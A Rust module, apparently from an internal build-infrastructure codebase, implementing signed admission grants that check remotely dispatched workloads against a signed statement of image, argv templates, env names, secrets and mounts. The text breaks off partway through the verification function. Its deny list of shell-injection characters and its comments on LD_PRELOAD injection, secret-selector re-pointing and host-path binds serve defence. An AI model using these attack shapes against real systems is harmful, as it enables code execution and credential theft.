//! Signed-recipe admission for dispatched workloads — W235 §(c), R555-F4.
//!
//! # The surface this closes
//!
//! A remote QED run executes *arbitrary recipe steps on shared infrastructure*.
//! Everything between the camp and the node authenticates the **dispatcher**
//! (mesh identity, yubaba admission), and nothing authenticates the **payload**:
//! whoever can reach a build worker's yubaba can name any digest-pinned image
//! and any argv, at `tier = "infra"`, with host networking — and, since R636-B2,
//! can ask for `CAP_SETUID` + `CAP_SETGID` + `no_new_privs` off on top. That is
//! remote code execution as a feature, gated only on being inside the mesh.
//!
//! An [`AdmissionGrant`] is the missing half: a small, signed document stating
//! *what a recipe is allowed to run*. The recipe author signs it once, offline;
//! the dispatcher carries it verbatim in three annotations; kamaji verifies the
//! signature against pinned keys and then checks that the spec in front of it
//! does not exceed what the grant describes.
//!
//! # What the grant covers, and why exactly that
//!
//! R710-S1 is the cautionary precedent: the original plugin-manifest signature
//! authenticated `source_ref` alone, on the reasoning that it transitively
//! pinned the bytes — leaving the *grant* (capabilities, sandbox profile)
//! unsigned, i.e. authenticating precisely the field an attacker has no reason
//! to touch. The same mistake here would be signing the recipe name, or its
//! BLAKE3, and calling the run admitted.
//!
//! So the grant covers every field that determines **what code runs and with
//! what privilege**:
//!
//! | Field | Why it is in the payload |
//! |---|---|
//! | `image` | the code, content-addressed |
//! | `entrypoint`, `argv` | the code, as invoked |
//! | `env-name` | `LD_PRELOAD` and friends are code injection by another name |
//! | `workdir` | selects which of several trees a relative argv resolves against |
//! | `tier` | the tier is what every other privilege gate keys on |
//! | `host-network`, `nested-sandbox` | the two privilege widenings that exist |
//! | `secret` | which vault credentials the run may read (R555-F5) |
//!
//! `recipe` rides along as a label, so a refusal names something a human can go
//! read.
//!
//! Deliberately **not** covered: `resources`, `replicas`, the mesh-tag node
//! selector, `expose`. None of them change what executes; folding them in would
//! force a re-sign every time a build's memory ceiling moved.
//!
//! # Secrets (R555-F5) — the second thing a payload can steal
//!
//! F4 shipped with `secret` absent from that table and a note on the env check
//! saying values need no constraint because an un-admitted *name* cannot be set
//! at all. That reasoning holds for a literal and fails for a reference: the
//! value of an [`EnvValue::FromSecret`] *is* the selector, and a
//! [`SecretMount`](crate::SecretMount) was not looked at by [`covers`] at all.
//! So a recipe admitted to set `R2_TOKEN` could be re-pointed at the cosign
//! signing key without disturbing a byte the signature covered — the grant
//! authenticated what the run *executes* and left what it *reads* ambient.
//!
//! The grant now carries a [`GrantSecret`] allow-list, and [`covers`] enforces
//! it exactly (no template matching — a secret name is not a per-run value).
//! Two shapes are refused outright rather than admitted:
//!
//! - **Env-target secret delivery**, in either spelling
//!   ([`SecretTarget::EnvVar`](crate::SecretTarget::EnvVar) or
//!   [`EnvValue::FromSecret`]). Nothing implements it end to end — yubaba
//!   materializes only `File` targets and both kamaji backends reject an
//!   unresolved `FromSecret` — and [`SecretTarget`](crate::SecretTarget)'s own
//!   doc says to prefer `File` because env leaks through subprocess env and log
//!   dumps. Admitting an unimplemented delivery path would mean signing for
//!   something whose behaviour is not yet decided.
//! - Anything not on the list, including a mount the signer never wrote.
//!
//! The one subtlety is that **the spec kamaji admits is not the spec the
//! dispatcher signed**: yubaba resolves each `File` mount into a read-only bind
//! of a tmpfs file (`deploy::secret_mount`) *before* the backend sees it. So
//! [`covers`] accepts either form — the declared mount, or the injected bind at
//! exactly the path [`crate::secret_mount::materialized_host_path`] derives for
//! this spec's own ident. Any other bind outside the forge state root is still
//! refused, so the exemption cannot be used to mount a sibling workload's
//! secret dir.
//!
//! [`covers`]: AdmissionGrant::covers
//!
//! Also deliberately absent: a **hash of the recipe file**. It is the obvious
//! provenance field and it is wrong twice over. It is circular — signing writes
//! the signature into that same file, so the hash the author signed is never the
//! hash the dispatcher computes — and it over-binds: a recipe TOML is mostly
//! comments and `@yah:` board annotations, so editing a comment would un-sign
//! the recipe. The grant's own body is the better identity, because it is
//! exactly the part of the recipe whose change *should* invalidate a signature.
//!
//! # Why argv is a *template*
//!
//! A recipe's argv is authored with `{{...}}` holes that the materialize path
//! substitutes per run — `{{YAH_TRANSFORM_OUT}}` becomes a path containing the
//! derivation key, `{{target}}` becomes a caller-supplied param. A signature
//! over the *substituted* argv could therefore only be produced at dispatch
//! time, by a key the dispatcher holds — which reduces the whole gate to "the
//! dispatcher is authenticated", something the mesh already provides.
//!
//! So the grant carries the template, and [`AdmissionGrant::covers`] checks the
//! received argv is an instantiation of it. The security property comes from
//! constraining the holes: recipes write shell strings
//! (`build-v8.sh '{{target}}' '{{YAH_TRANSFORM_OUT}}'`), so a hole that may not
//! contain a quote, a `$`, a backtick, a `;`, a `|`, or a `..` cannot break out
//! of the quoting the author wrote. See [`hole_is_safe`].
//!
//! # Policy, and what is on by default
//!
//! [`Policy::Permissive`] is the default: a grant, **if present**, must verify —
//! absent is allowed. That makes deploying this code a no-op for the live
//! pipeline-offload path (a `qed run --where=remote` step comes from a pipeline,
//! not a recipe, and has no grant) while making tampering with a *signed*
//! dispatch detectable immediately.
//!
//! One exception is unconditional, and it is the point of the R636-B2 coupling
//! W235 §Reshaping names: **a workload requesting the nested-sandbox grant needs
//! a valid admission grant under every policy except [`Policy::Disabled`].**
//! B2's widening is what raises the cost of an admission gap from "arbitrary
//! code in a tight sandbox" to "arbitrary code with SETUID and no-new-privs
//! off", so the widening does not get to be used un-admitted. That costs nothing
//! today — B2's grant is built but not yet deployed on any worker — and it means
//! the ordering W235 asked for ("B2's widening is defensible only once F4's
//! admission gate exists") is enforced by the code rather than by sequencing
//! discipline.
//!
//! [`Policy::Required`] is the end state for a shared build worker: no grant, no
//! run. It is an operator flip per node (`YAH_ADMISSION=required`), because
//! turning it on before that node's dispatchers sign is a self-inflicted outage.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use thiserror::Error;

use crate::{EnvValue, SecretMount, SecretRef, SecretTarget, VolumeSource, WorkloadSpec};

/// Annotation carrying the admission grant document verbatim.
///
/// The value is the exact byte string [`AdmissionGrant::encode`] produces and
/// the exact byte string the signature is over. Annotations do not reach the OCI
/// spec (kamaji builds that from typed fields), so carrying a few hundred bytes
/// here costs nothing at runtime.
pub const GRANT_ANNOTATION: &str = "yah.admission.grant";

/// Annotation carrying the hex-encoded Ed25519 detached signature over the
/// [`GRANT_ANNOTATION`] value.
pub const GRANT_SIGNATURE_ANNOTATION: &str = "yah.admission.signature";

/// Annotation carrying the hex-encoded Ed25519 public key that signed the
/// grant. Checked against the verifier's pinned key set *before* the signature
/// is verified — an untrusted key can produce a perfectly valid signature, so
/// verifying it first would be answering the wrong question (the ordering
/// `yah_plugin::verify_manifest` established).
pub const GRANT_KEY_ANNOTATION: &str = "yah.admission.key";

/// Domain separator opening every grant document. Also the format version: a
/// verifier that does not recognise the line refuses rather than guessing.
///
/// **v2 (R555-F5)** added the `secret` allow-list. The bump costs nothing: no
/// grant has ever been signed outside a test fixture (every recipe in
/// `.yah/qed/transforms/` is `location = "local"`, which `recipe-sign` skips),
/// and a version skew between a new dispatcher and an old node now surfaces as
/// [`GrantError::BadMagic`] rather than as a trailing-bytes parse failure that
/// reads like corruption.
pub const GRANT_MAGIC: &str = "yah-admission-grant/v2";

/// Characters a template hole may not contain.
///
/// Recipe argv elements are shell strings the author quoted by hand
/// (`build-v8.sh '{{target}}'`). These are the characters that let a
/// substituted value escape that quoting, plus the ones that would let it reach
/// a second command. `..` is rejected separately by [`hole_is_safe`] — it is a
/// two-character sequence, not a class member.
pub const FORBIDDEN_HOLE_CHARS: &[char] = &[
    '\'', '"', '`', '$', ';', '|', '&', '<', '>', '(', ')', '{', '}', '\\', '\n', '\r', '\0',
];

/// Whether a substituted template hole's content is safe to have landed inside
/// a recipe-authored shell string.
///
/// This is the whole security argument for template matching, so it is stated
/// as a rule rather than a heuristic: the recipe author controls the quoting,
/// and a value that contains none of [`FORBIDDEN_HOLE_CHARS`] and no `..`
/// cannot change the command's structure — only which noun it names.
pub fn hole_is_safe(value: &str) -> bool {
    !value.contains("..") && !value.contains(FORBIDDEN_HOLE_CHARS)
}

/// Which runtime the grant admits. Mirrors the
/// [`NATIVE_EXEC_ANNOTATION`](crate::NATIVE_EXEC_ANNOTATION) marker rather than
/// re-deriving it: a native forge is fork+exec'd on the host with no container
/// boundary at all, which is a materially different thing to admit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GrantRuntime {
    /// Container backend (the default shape).
    Container,
    /// Host fork+exec — no container boundary. See
    /// [`WorkloadSpec::wants_native_exec`].
    Native,
    /// KVM guest with its own kernel — a *stronger* boundary than a container,
    /// not a weaker one. See [`WorkloadSpec::wants_microvm`] (R605-F8).
    ///
    /// It is nonetheless a distinct runtime in the grant rather than being
    /// folded into [`Self::Container`], because a grant states what it admits:
    /// a recipe signed to run in a container and a recipe signed to run in a
    /// microVM differ in what the argv can reach (its own kernel, its own
    /// device set, a host filesystem it sees only through the drives kamaji
    /// attaches), and one describing the other would be false in both
    /// directions.
    MicroVm,
}

impl GrantRuntime {
    fn as_str(self) -> &'static str {
        match self {
            GrantRuntime::Container => "container",
            GrantRuntime::Native => "native",
            GrantRuntime::MicroVm => "microvm",
        }
    }

    /// The runtime a spec actually selects, from its `yah.exec` marker.
    ///
    /// One function so the signing site ([`AdmissionGrant::from_spec`]) and the
    /// verifying site ([`AdmissionGrant::verify_matches`]) cannot disagree —
    /// they were two copies of the same `if` before R605-F8 added a third arm,
    /// which is exactly when a duplicated ladder starts to drift.
    fn of_spec(spec: &WorkloadSpec) -> Self {
        if spec.wants_native_exec() {
            GrantRuntime::Native
        } else if spec.wants_microvm() {
            GrantRuntime::MicroVm
        } else {
            GrantRuntime::Container
        }
    }
}

/// How strictly a node enforces admission.
///
/// See the module docs for why [`Policy::Permissive`] is the default and why
/// the nested-sandbox exception is unconditional.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Policy {
    /// No admission checking at all — pre-R555-F4 behaviour. An escape hatch
    /// for a node debugging its own signing setup; it also disables the
    /// nested-sandbox exception, which is why it is not the default.
    Disabled,
    /// A grant, if present, must verify. A workload with no grant runs, unless
    /// it requests the nested-sandbox widening.
    #[default]
    Permissive,
    /// Every workload must carry a grant that verifies.
    Required,
}

impl Policy {
    /// Parse a policy name. Accepts exactly the three spellings; anything else
    /// is an error rather than a silent fallback, because "I typoed the env var
    /// and admission quietly turned off" is the failure this whole module is
    /// about.
    pub fn parse(s: &str) -> Result<Self, String> {
        match s.trim() {
            "disabled" => Ok(Policy::Disabled),
            "permissive" => Ok(Policy::Permissive),
            "required" => Ok(Policy::Required),
            other => Err(format!(
                "unknown admission policy {other:?}; expected \"disabled\", \
                 \"permissive\" or \"required\""
            )),
        }
    }
}

/// A signed statement of what one recipe is allowed to run.
///
/// Construct with [`AdmissionGrant::from_spec`] at signing time (so the grant
/// and the thing it describes cannot drift), encode with
/// [`AdmissionGrant::encode`], sign the encoded bytes, and attach all three
/// pieces with [`attach`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AdmissionGrant {
    /// Recipe name, so a refusal names something a human can go read. Signed
    /// like everything else, so it cannot be re-attributed after the fact.
    pub recipe: String,
    /// Canonical pinned image reference, as [`image_ref_string`] renders it.
    pub image: String,
    /// Tier the workload may run at.
    pub tier: String,
    /// Container or host fork+exec.
    pub runtime: GrantRuntime,
    /// Whether the recipe may request the host network namespace.
    pub host_network: bool,
    /// Whether the recipe may request the nested-sandbox capability widening.
    pub nested_sandbox: bool,
    /// Working directory the recipe may declare, if any.
    pub workdir: Option<String>,
    /// Entrypoint templates, in order.
    pub entrypoint: Vec<String>,
    /// Argv templates, in order. `{{...}}` holes are matched, not compared.
    pub argv: Vec<String>,
    /// Environment variable *names* the recipe may set. Values are
    /// unconstrained for a [`EnvValue::Literal`] — a name that is not on this
    /// list cannot be set at all. A `FromSecret` value is a different question
    /// and is refused outright; see the module docs.
    pub env_names: Vec<String>,
    /// Vault credentials the recipe may read, exactly. Empty on a recipe that
    /// declares none, which then cannot read any — the fail-closed direction,
    /// and the state every recipe in the tree is in today.
    pub secrets: Vec<GrantSecret>,
}

/// One vault credential a grant admits, as a file inside the workload.
///
/// File-target only, on purpose — see the module docs on why env-target secret
/// delivery is refused rather than admitted. `mode` is in the signed body
/// because a secret readable by every uid in the container is a different grant
/// from one readable by its owner.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GrantSecret {
    /// Where yubaba reads the value from.
    pub source: SecretRef,
    /// Absolute container path the value is mounted at.
    pub path: PathBuf,
    /// File mode, octal.
    pub mode: u32,
}

impl GrantSecret {
    /// The grant entry a spec's mount corresponds to, or `None` when the mount
    /// is one no grant can admit (an env target).
    pub fn of_mount(mount: &SecretMount) -> Option<Self> {
        match &mount.target {
            SecretTarget::File { path, mode } => Some(Self {
                source: mount.source.clone(),
                path: path.clone(),
                mode: *mode,
            }),
            SecretTarget::EnvVar { .. } => None,
        }
    }

    /// Operator-facing rendering, for refusal messages only. Never parsed —
    /// the wire form is the four records [`AdmissionGrant::encode`] writes.
    pub fn describe(&self) -> String {
        let source = match &self.source {
            SecretRef::Cluster { name } => format!("cluster:{name}"),
            SecretRef::LocalFile { path } => format!("local-file:{}", path.display()),
        };
        format!("{source} → {} (mode {:o})", self.path.display(), self.mode)
    }

    fn source_kind(&self) -> &'static str {
        match self.source {
            SecretRef::Cluster { .. } => "cluster",
            SecretRef::LocalFile { .. } => "local-file",
        }
    }

    fn source_value(&self) -> String {
        match &self.source {
            SecretRef::Cluster { name } => name.clone(),
            SecretRef::LocalFile { path } => path.to_string_lossy().into_owned(),
        }
    }
}

/// Render an [`ImageRef`](crate::ImageRef) the one way the grant compares them.
///
/// Hand-rolled rather than a `Display` impl on `ImageRef` so the encoding this
/// module signs cannot be changed by an unrelated edit to that type's
/// formatting — the same reasoning `yah_plugin::signing_payload` records for
/// not signing serialized TOML.
pub fn image_ref_string(image: &crate::ImageRef) -> String {
    format!(
        "{}/{}:{}@{}",
        image.registry, image.repository, image.tag, image.digest
    )
}

impl AdmissionGrant {
    /// Cut a grant from a spec that is already exactly what should be admitted.
    ///
    /// This is the signing-time constructor: lower the recipe to a
    /// `WorkloadSpec` with its argv left un-substituted (holes intact), pass it
    /// here, encode, sign. Deriving the grant from the spec rather than from the
    /// recipe means the grant describes the thing that will actually be checked,
    /// with no second lowering to keep in step.
    pub fn from_spec(recipe: &str, spec: &WorkloadSpec) -> Self {
        Self {
            recipe: recipe.to_string(),
            image: image_ref_string(&spec.image),
            tier: spec.tier.0.clone(),
            runtime: GrantRuntime::of_spec(spec),
            host_network: spec.wants_host_network(),
            nested_sandbox: spec.wants_nested_sandbox(),
            workdir: spec
                .workdir
                .as_ref()
                .map(|p| p.to_string_lossy().into_owned()),
            entrypoint: spec.entrypoint.clone().unwrap_or_default(),
            argv: spec.command.clone().unwrap_or_default(),
            env_names: spec.env.iter().map(|e| e.name.clone()).collect(),
            // An env-target mount yields no entry, so signing a spec that
            // carries one produces a grant that does not cover it — the same
            // refusal a verifier reaches, surfaced at signing time instead.
            secrets: spec.secrets.iter().filter_map(GrantSecret::of_mount).collect(),
        }
    }

    /// The exact bytes a recipe author signs, and the exact bytes a verifier
    /// verifies over.
    ///
    /// A domain-separated sequence of length-prefixed records in fixed field
    /// order: `<label> <byte-len>\n<value>\n`. The length prefix is what lets a
    /// value contain a newline (a `bash -c` argv routinely does) without any
    /// escaping, and fixed order plus explicit counts make the encoding
    /// injective — two different grants cannot produce the same bytes.
    ///
    /// Hand-rolled rather than "serialize to TOML/JSON and sign that", for the
    /// reason `yah_plugin::signing_payload` states: a serializer's output is a
    /// formatting decision of a dependency, so a version bump could silently
    /// invalidate every signature ever issued.
    pub fn encode(&self) -> String {
        let mut out = String::with_capacity(512);
        out.push_str(GRANT_MAGIC);
        out.push('\n');
        record(&mut out, "recipe", &self.recipe);
        record(&mut out, "image", &self.image);
        record(&mut out, "tier", &self.tier);
        record(&mut out, "runtime", self.runtime.as_str());
        record(&mut out, "host-network", bool_str(self.host_network));
        record(&mut out, "nested-sandbox", bool_str(self.nested_sandbox));
        list(&mut out, "workdir", self.workdir.as_slice_of_one());
        list(&mut out, "entrypoint", &self.entrypoint);
        list(&mut out, "argv", &self.argv);
        list(&mut out, "env-name", &self.env_names);
        // Four records per entry rather than one joined string: joining needs a
        // separator, and a separator inside a secret name or a mount path makes
        // two different allow-lists encode to the same bytes. The record shape
        // is already length-prefixed and therefore already injective.
        record(&mut out, "secret", &self.secrets.len().to_string());
        for s in &self.secrets {
            record(&mut out, "secret.source-kind", s.source_kind());
            record(&mut out, "secret.source", &s.source_value());
            record(&mut out, "secret.path", &s.path.to_string_lossy());
            record(&mut out, "secret.mode", &format!("{:o}", s.mode));
        }
        out
    }

    /// Parse the encoding [`AdmissionGrant::encode`] produces.
    ///
    /// Strict on purpose: an unrecognised magic line, a label out of order, a
    /// length that does not match, or trailing bytes are all errors. A verifier
    /// that guesses at a malformed grant is a verifier that can be steered.
    pub fn parse(text: &str) -> Result<Self, GrantError> {
        let mut cur = Cursor::new(text);
        cur.magic()?;
        let recipe = cur.record("recipe")?;
        let image = cur.record("image")?;
        let tier = cur.record("tier")?;
        let runtime = match cur.record("runtime")?.as_str() {
            "container" => GrantRuntime::Container,
            "native" => GrantRuntime::Native,
            "microvm" => GrantRuntime::MicroVm,
            other => {
                return Err(GrantError::BadValue {
                    label: "runtime",
                    reason: format!(
                        "expected \"container\", \"native\" or \"microvm\", got {other:?}"
                    ),
                })
            }
        };
        let host_network = cur.bool_record("host-network")?;
        let nested_sandbox = cur.bool_record("nested-sandbox")?;
        let mut workdir = cur.list("workdir")?;
        if workdir.len() > 1 {
            return Err(GrantError::BadValue {
                label: "workdir",
                reason: format!("expected 0 or 1 entries, got {}", workdir.len()),
            });
        }
        let entrypoint = cur.list("entrypoint")?;
        let argv = cur.list("argv")?;
        let env_names = cur.list("env-name")?;
        let secrets = cur.secrets()?;
        cur.end()?;

        Ok(Self {
            recipe,
            image,
            tier,
            runtime,
            host_network,
            nested_sandbox,
            workdir: workdir.pop(),
            entrypoint,
            argv,
            env_names,
            secrets,
        })
    }

    /// Check that `spec` does not exceed what this grant describes.
    ///
    /// The comparison is deliberately asymmetric where asymmetry is safe: a spec
    /// may request *less* privilege than the grant allows (host networking and
    /// the nested sandbox are implications, not equalities), but the code it
    /// runs must match exactly — modulo template holes.
    ///
    /// This is signature-independent: it answers "is this spec the thing the
    /// grant describes", not "did anyone vouch for the grant". [`admit`]
    /// composes the two in the right order.
    pub fn covers(&self, spec: &WorkloadSpec) -> Result<(), AdmissionError> {
        let actual_image = image_ref_string(&spec.image);
        if actual_image != self.image {
            return Err(AdmissionError::Mismatch {
                field: "image",
                detail: format!("grant admits {}, spec names {actual_image}", self.image),
            });
        }
        if spec.tier.0 != self.tier {
            return Err(AdmissionError::Mismatch {
                field: "tier",
                detail: format!("grant admits {:?}, spec declares {:?}", self.tier, spec.tier.0),
            });
        }

        let actual_runtime = GrantRuntime::of_spec(spec);
        if actual_runtime != self.runtime {
            return Err(AdmissionError::Mismatch {
                field: "runtime",
                detail: format!(
                    "grant admits {}, spec is {}",
                    self.runtime.as_str(),
                    actual_runtime.as_str()
                ),
            });
        }

        // Privilege widenings: implication, not equality. Asking for less than
        // the grant allows is always fine.
        if spec.wants_host_network() && !self.host_network {
            return Err(AdmissionError::Mismatch {
                field: "host-network",
                detail: "spec requests the host network namespace; the grant does not admit it"
                    .into(),
            });
        }
        if spec.wants_nested_sandbox() && !self.nested_sandbox {
            return Err(AdmissionError::Mismatch {
                field: "nested-sandbox",
                detail: "spec requests the nested-sandbox capability widening \
                         (CAP_SETUID + CAP_SETGID, no_new_privs off); the grant does not admit it"
                    .into(),
            });
        }

        // Workdir is template-matched, not compared: a NATIVE forge's workdir is
        // the per-run host produced dir (`…/qed/produced/<forge id>`), so an
        // equality check would force a re-sign per dispatch. Present-vs-absent
        // is still exact — a grant that names no workdir does not admit one.
        let actual_workdir = spec
            .workdir
            .as_ref()
            .map(|p| p.to_string_lossy().into_owned());
        match (&self.workdir, &actual_workdir) {
            (None, None) => {}
            (Some(template), Some(actual)) if template_matches(template, actual) => {}
            _ => {
                return Err(AdmissionError::Mismatch {
                    field: "workdir",
                    detail: format!(
                        "grant admits {:?}, spec declares {:?}",
                        self.workdir, actual_workdir
                    ),
                })
            }
        }

        templates_cover(
            "entrypoint",
            &self.entrypoint,
            spec.entrypoint.as_deref().unwrap_or(&[]),
        )?;
        templates_cover("argv", &self.argv, spec.command.as_deref().unwrap_or(&[]))?;

        // Env NAMES are the gate; values need no constraint because a name that
        // is not admitted cannot be set at all. `LD_PRELOAD` is the shape of
        // attack this closes.
        let admitted: BTreeSet<&str> = self.env_names.iter().map(String::as_str).collect();
        for env in &spec.env {
            if !admitted.contains(env.name.as_str()) {
                return Err(AdmissionError::Mismatch {
                    field: "env",
                    detail: format!(
                        "spec sets {:?}, which the grant does not admit (admitted: {:?})",
                        env.name, self.env_names
                    ),
                });
            }
            // A FromSecret VALUE is a selector, not a value: admitting the name
            // `R2_TOKEN` would otherwise admit reading the cosign key through
            // it. Refused rather than allow-listed because nothing implements
            // env-target secret delivery end to end — see the module docs.
            if let EnvValue::FromSecret { secret, .. } = &env.value {
                return Err(AdmissionError::Mismatch {
                    field: "env",
                    detail: format!(
                        "spec resolves {:?} from secret {secret:?}; env-target secret \
                         delivery is not admissible — mount the secret as a file \
                         (SecretTarget::File) and declare it in the grant",
                        env.name
                    ),
                });
            }
            // FromMesh is yubaba's to fill in before deploy and each backend
            // already rejects it unresolved. Named here so a grant author
            // reading this list knows admission is not the layer that resolves.
        }

        // R555-F5: every credential the run may read, exactly. No template
        // matching — a secret name is authored, not substituted per run.
        for mount in &spec.secrets {
            let Some(want) = GrantSecret::of_mount(mount) else {
                return Err(AdmissionError::Mismatch {
                    field: "secrets",
                    detail: "spec mounts a secret as an environment variable; \
                             env-target secret delivery is not admissible — use \
                             SecretTarget::File"
                        .into(),
                });
            };
            if !self.secrets.contains(&want) {
                return Err(AdmissionError::Mismatch {
                    field: "secrets",
                    detail: format!(
                        "spec mounts {}, which the grant does not admit (admitted: [{}])",
                        want.describe(),
                        self.describe_secrets()
                    ),
                });
            }
        }

        // Bind mounts are the one field the grant does not enumerate, because
        // the produced-dir mount is per-run (`/var/lib/yah/qed/produced/<forge
        // id>`) and would force a re-sign per dispatch. The structural rule
        // R636-B1 already established covers it instead: a forge bind must live
        // under the forge state root. Checked here rather than assumed, because
        // an admitted spec that can bind `/` has not been admitted at all.
        //
        // The one exemption is yubaba's own rewrite of an admitted File secret
        // (R555-F5) — recomputed, not trusted: same container path, the exact
        // host path derived for THIS spec's ident, and read-only.
        let ident = spec.expose.mesh.identity.0.as_str();
        for volume in &spec.volumes {
            if let VolumeSource::Bind { host_path } = &volume.source {
                if crate::forge_state::is_forge_state_path(host_path) {
                    continue;
                }
                if self.is_materialized_secret_bind(ident, host_path, volume) {
                    continue;
                }
                return Err(AdmissionError::Mismatch {
                    field: "volumes",
                    detail: format!(
                        "spec binds host path {} which is outside the forge state root {} \
                         and is not a materialized mount of an admitted secret",
                        host_path.display(),
                        crate::forge_state::HOST_ROOT
                    ),
                });
            }
        }

        Ok(())
    }

    /// Whether `volume` is the read-only bind yubaba injects when it
    /// materializes one of this grant's own admitted `File` secrets for the
    /// workload `ident`.
    ///
    /// Every input is recomputed from the spec and the grant; nothing about the
    /// bind is taken on trust. In particular the `ident` component is why this
    /// cannot be used to reach a sibling workload's secret dir, and the
    /// read-only requirement is why it cannot be used to *write* one.
    ///
    /// The root is [`crate::secret_mount::HOST_ROOT`] rather than a parameter
    /// because a verifier holds a spec and nothing else — it has no way to
    /// learn a root the *writer* chose. Yubaba's root is overridable only by
    /// `with_secret_paths`, which exists for tests. If that ever becomes a real
    /// deployment knob, this stops matching and a granted secret is *refused*
    /// rather than waved through, which is the direction to fail in.
    fn is_materialized_secret_bind(
        &self,
        ident: &str,
        host_path: &Path,
        volume: &crate::VolumeMount,
    ) -> bool {
        if !volume.read_only {
            return false;
        }
        self.secrets.iter().any(|s| {
            s.path == volume.target
                && crate::secret_mount::materialized_host_path(
                    Path::new(crate::secret_mount::HOST_ROOT),
                    ident,
                    &s.path,
                ) == host_path
        })
    }

    /// The admitted credentials, for a refusal message.
    pub fn describe_secrets(&self) -> String {
        self.secrets
            .iter()
            .map(GrantSecret::describe)
            .collect::<Vec<_>>()
            .join(", ")
    }
}

/// Attach a grant, its signature and its signing key to a spec's annotations.
///
/// The dispatcher's whole job: it does not compute or check anything, it
/// carries three opaque strings the recipe author produced. Keeping it that way
/// is what keeps the signing key off every machine that dispatches.
pub fn attach(spec: &mut WorkloadSpec, grant: &str, signature: &str, public_key: &str) {
    spec.annotations
        .insert(GRANT_ANNOTATION.into(), grant.to_string());
    spec.annotations
        .insert(GRANT_SIGNATURE_ANNOTATION.into(), signature.to_string());
    spec.annotations
        .insert(GRANT_KEY_ANNOTATION.into(), public_key.to_string());
}

/// Whether a spec carries any admission annotation at all.
///
/// "Any", not "all": a spec with a grant and no signature is a tampering
/// attempt or a broken dispatcher, and both must reach the error path rather
/// than the treated-as-unsigned path.
pub fn has_grant_annotations(spec: &WorkloadSpec) -> bool {
    spec.annotations.contains_key(GRANT_ANNOTATION)
        || spec.annotations.contains_key(GRANT_SIGNATURE_ANNOTATION)
        || spec.annotations.contains_key(GRANT_KEY_ANNOTATION)
}

// ── template matching ────────────────────────────────────────────────────────

fn templates_cover(
    field: &'static str,
    templates: &[String],
    actual: &[String],
) -> Result<(), AdmissionError> {
    if templates.len() != actual.len() {
        return Err(AdmissionError::Mismatch {
            field,
            detail: format!(
                "grant admits {} element(s), spec has {}",
                templates.len(),
                actual.len()
            ),
        });
    }
    for (i, (template, got)) in templates.iter().zip(actual).enumerate() {
        if !template_matches(template, got) {
            return Err(AdmissionError::Mismatch {
                field,
                detail: format!("element {i}: {got:?} is not an instantiation of {template:?}"),
            });
        }
    }
    Ok(())
}

/// Whether `actual` is `template` with each `{{...}}` hole filled by a value
/// [`hole_is_safe`] accepts.
///
/// Literal segments are matched left to right at the earliest position each
/// occurs, which is well-defined for every template the recipe format can
/// produce: holes are separated by author-written literals (`' '`, ` `, `/`),
/// so the leftmost match is the intended one. A template with no holes degrades
/// to string equality.
pub fn template_matches(template: &str, actual: &str) -> bool {
    let segments = literal_segments(template);
    // No holes: exact match, nothing to constrain.
    if segments.len() == 1 {
        return template == actual;
    }

    let mut rest = actual;
    let Some(first) = segments.first() else {
        return false;
    };
    let Some(after_first) = rest.strip_prefix(first.as_str()) else {
        return false;
    };
    rest = after_first;

    for (i, segment) in segments.iter().enumerate().skip(1) {
        let last = i == segments.len() - 1;
        if last && segment.is_empty() {
            // Template ends with a hole: everything left is its content.
            return hole_is_safe(rest);
        }
        let Some(at) = rest.find(segment.as_str()) else {
            return false;
        };
        if !hole_is_safe(&rest[..at]) {
            return false;
        }
        rest = &rest[at + segment.len()..];
    }
    rest.is_empty()
}

/// Split a template into its literal segments — the text between `{{` … `}}`
/// holes, with one segment before the first hole and one after the last. `n`
/// holes yield `n + 1` segments, so `segments.len() == 1` means "no holes".
///
/// An unterminated `{{` is literal text, matching `substitute_argv`'s own rule
/// (an unterminated placeholder is preserved verbatim, so a template that
/// contains one is compared verbatim too).
fn literal_segments(template: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut rest = template;
    while let Some(open) = rest.find("{{") {
        let Some(close_rel) = rest[open + 2..].find("}}") else {
            break;
        };
        current.push_str(&rest[..open]);
        segments.push(std::mem::take(&mut current));
        rest = &rest[open + 2 + close_rel + 2..];
    }
    current.push_str(rest);
    segments.push(current);
    segments
}

// ── verification ─────────────────────────────────────────────────────────────

/// Verify the admission annotations on `spec` under `policy` and a pinned key
/// set.
///
/// Order is cheapest-and-most-decisive first, mirroring
/// `yah_plugin::verify_manifest`:
///
/// 1. **Is a grant required?** [`Policy::Required`], or the unconditional
///    nested-sandbox exception (see the module docs).
/// 2. **Is one present and complete?** A partial annotation set is an error, not
///    an absence.
/// 3. **Attribution** — the signing key must be one `trusted_keys` pins. An
///    untrusted key can produce a valid signature; checking it first would be
///    answering the wrong question.
/// 4. **Signature** over the grant bytes, with `verify_strict`.
/// 5. **Coverage** — [`AdmissionGrant::covers`].
///
/// A verifier with `Policy::Required` and an **empty** key set refuses
/// everything: pinning nothing means trusting nothing, which is the fail-closed
/// direction. That is deliberate, and it is the reason an operator flipping a
/// node to `required` without configuring keys gets a loud outage rather than a
/// quiet no-op gate.
#[cfg(feature = "admission-verify")]
pub fn admit(
    spec: &WorkloadSpec,
    policy: Policy,
    trusted_keys: &[String],
) -> Result<(), AdmissionError> {
    admit_grant(spec, policy, trusted_keys).map(|_| ())
}

/// [`admit`], returning the grant it verified.
///
/// `Ok(None)` means "admitted, and there was no grant to read" — the permissive
/// no-annotations path. `Ok(Some(grant))` hands back a document that has passed
/// attribution, signature and coverage, which is the only form in which a
/// caller may treat the recipe name inside it as an *identity*.
///
/// That distinction is the whole reason this variant exists: R555-F5 keys
/// cluster-secret access on the signed recipe
/// ([`SecretAccess::Recipes`](crate::secrets::SecretAccess::Recipes)) rather
/// than on the workload name, because a forge workload's name is a fresh
/// `forge-<uuid>` every run and therefore cannot appear in any allow-list
/// written ahead of time. Reading `recipe` out of an *unverified* grant would
/// make that allow-list bearer-authorized again — which is the exact hole R706
/// closed for the workload case.
#[cfg(feature = "admission-verify")]
pub fn admit_grant(
    spec: &WorkloadSpec,
    policy: Policy,
    trusted_keys: &[String],
) -> Result<Option<AdmissionGrant>, AdmissionError> {
    use ed25519_dalek::{Signature, VerifyingKey};

    if policy == Policy::Disabled {
        return Ok(None);
    }

    let present = has_grant_annotations(spec);
